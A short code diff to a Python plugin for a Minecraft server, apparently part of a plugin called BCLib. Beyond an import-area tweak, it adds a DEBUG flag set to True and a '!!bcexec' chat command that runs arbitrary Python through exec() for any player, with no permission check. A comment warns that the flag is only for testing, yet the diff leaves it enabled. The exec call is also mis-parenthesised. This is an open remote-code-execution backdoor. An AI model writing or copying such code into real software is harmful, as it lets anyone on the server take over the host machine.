@@ -14,7 +14,7 @@ import requests as rq
 import threading as thd
 import importlib as ilib
 
-global pack_actions, packobj, datapack_lib, SERVER_STARTED
+global pack_actions, packobj, datapack_lib, SERVER_STARTED, DEBUG
 SERVER_STARTED = False
 
 pack_actions = ilib.import_module('plugins.BCLib.pack_actions')
@@ -26,6 +26,10 @@ bgSRV = None
 
 # fast function
 NO_PERMISSION = lambda server, info: server.tell(info.player, "§c权限不足")
+
+# 调试模式
+# 仅用于功能测试，请不要随意开启！
+DEBUG = True
 
 global tasks, blb, COMMAND_LINKS
 blb = None
@@ -98,6 +102,13 @@ def on_info(server, info):
         info.player_bcsign = info.player
 
     global tasks
+    if DEBUG:
+        if command[0] == '!!bcexec':
+            try:
+                exec(' '.join(command[1:])), globals(), locals()
+                server.reply(info,'done.')
+            except Exception as exp:
+                server.reply(info,str(exp))
     if command[0] == '!!bc':
         if len(command) == 1:
             pack_actions.show_help_msg(server, info)
